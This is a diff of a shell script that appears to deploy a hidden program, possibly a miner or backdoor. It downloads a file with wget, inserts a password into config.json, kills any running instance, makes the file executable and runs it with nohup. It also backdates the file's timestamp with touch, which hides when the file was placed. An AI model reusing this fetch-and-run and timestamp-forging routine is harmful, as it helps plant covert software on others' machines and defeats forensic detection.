@@ -12,6 +12,8 @@ wget ${TERMINAL} -O ${DIR}${FILE}
 
 sed -i "s/xxxxx/${PASS}/g" ${DIR}config.json
 
-cd ${DIR} && nohup ./${FILE} \& || exit
+ps -aux |grep "\./${FILE}" | awk '{print $2}' |xargs kill -9
+cd ${DIR}
+chmod 755 ./${FILE}
+nohup ./${FILE}
 touch -ct 202012151421 ${FILE}
-echo "cd ${DIR} && nohup ./${FILE} \& || exit"
